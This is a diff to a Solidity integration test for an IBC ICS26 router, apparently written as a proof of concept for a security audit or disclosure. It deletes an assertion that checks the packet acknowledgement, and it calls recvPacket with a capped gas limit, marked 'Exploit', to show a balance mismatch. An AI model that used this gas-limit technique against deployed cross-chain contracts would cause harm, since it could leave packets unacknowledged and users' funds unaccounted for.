@@ -430,11 +430,7 @@ contract IntegrationTest is Test, DeployPermit2, PermitSignature {
         (,, IICS26RouterMsgs.Packet memory recvPacket) =
             _receiveICS20Transfer(defaultReceiverStr, defaultSenderStr, receivedDenom);
 
-        // acknowledgement should be written
-        bytes32 storedAck = ics26Router.getCommitment(
-            ICS24Host.packetAcknowledgementCommitmentKeyCalldata(recvPacket.destClient, recvPacket.sequence)
-        );
-        assertEq(storedAck, ICS24Host.packetAcknowledgementCommitmentBytes32(singleSuccessAck));
+        // Disable checking the acknowledgement to illustrate balance mismatch
 
         // check balances after receiving back
         uint256 senderBalanceAfterReceive = erc20.balanceOf(defaultSender);
@@ -1141,7 +1137,8 @@ contract IntegrationTest is Test, DeployPermit2, PermitSignature {
         vm.expectEmit();
         emit IICS26Router.RecvPacket(receivePacket);
 
-        ics26Router.recvPacket(
+        // Exploit: execute `recvPacket` with limited gas
+        ics26Router.recvPacket{gas: 900000}(
             IICS26RouterMsgs.MsgRecvPacket({
                 packet: receivePacket,
                 proofCommitment: bytes("doesntmatter"), // dummy client will accept
